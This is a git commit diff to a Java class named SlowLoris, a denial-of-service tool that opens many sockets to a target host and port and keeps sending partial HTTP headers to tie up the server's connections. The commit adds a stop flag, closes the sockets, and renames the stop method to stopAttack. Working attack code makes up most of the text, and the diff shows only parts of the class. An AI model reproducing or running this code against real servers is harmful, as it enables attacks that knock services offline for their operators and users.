bf7de197f76e37332b53592b5efea42b9f0c43be
Marcus <mariusadauge@gmail.com>
2016-05-18 23:09:04 +0300

    implemented safe thread interruption, sockets closed

--- SlowLoris.java
+++ SlowLoris.java
@@ -1,3 +1,4 @@
+import java.io.IOException;
 import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
@@ -22,8 +23,8 @@ public class SlowLoris extends Thread{
             + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
             + "Content-Length: 42\r\n";
 
-    public SlowLoris(ThreadGroup group, String host, int port, int timeout, int conn){
-        super(group, Integer.toString(++threadNr));
+    public SlowLoris(String host, int port, int timeout, int conn){
+        super(Integer.toString(++threadNr));
         this.stop = false;
         this.host = host;
         this.port = port;
@@ -33,22 +34,15 @@ public class SlowLoris extends Thread{
     }
 
     public void run() {
-        System.out.println("Thread " + Thread.currentThread().getId() + " started");
-        boolean[] w = new boolean[threads];
-        Socket[] s = new Socket[threads];
+        System.out.println("Attack started on thread " + Thread.currentThread().getId());
+        boolean[] w = new boolean[connections];
+        Socket[] s = new Socket[connections];
 
-        while (true) {
-           // System.out.println("Building Sockets...");
+        while (!stop) {
+            System.out.println("Building Sockets...");
             try {
-                for (int i = 0; i < threads; i++) {
-                    if(stop) {
-                        System.out.println("STOPPPPPPPPPP");
-                        for(Socket sock : s){
-                            sock.close();
-                        }
-                        break;
-                    }
-                    else if (!w[i]) {
+                for (int i = 0; i < connections; i++) {
+                    if (!w[i]) {
                         s[i] = new Socket();
                         InetAddress address = InetAddress.getByName(host);
                         s[i].connect(new InetSocketAddress(address.getHostAddress(), port), tcpTimeout);
@@ -70,7 +64,7 @@ public class SlowLoris extends Thread{
                 }
 
                 System.out.println("Sending Data...");
-                for (int i = 0; i < threads; i++) {
+                for (int i = 0; i < connections; i++) {
                     if (w[i]) {
                         PrintWriter out = new PrintWriter(s[i].getOutputStream());
                         out.print("X-a: b\r\n");    // keeps the connection alive; server waits like a 'loh' for new requests
@@ -97,9 +91,17 @@ public class SlowLoris extends Thread{
                 --active;
             }
         }
+
+        for(Socket sock : s){
+            try {
+                sock.close();
+            } catch (IOException e) { e.printStackTrace(); }
+            catch (NullPointerException ne){ ne.printStackTrace(); }
+        }
+        System.out.println("All sockets have been closed!");
     }
 
-    synchronized void stopFunc() {
+    synchronized void stopAttack() {
         stop = true;
     }
 
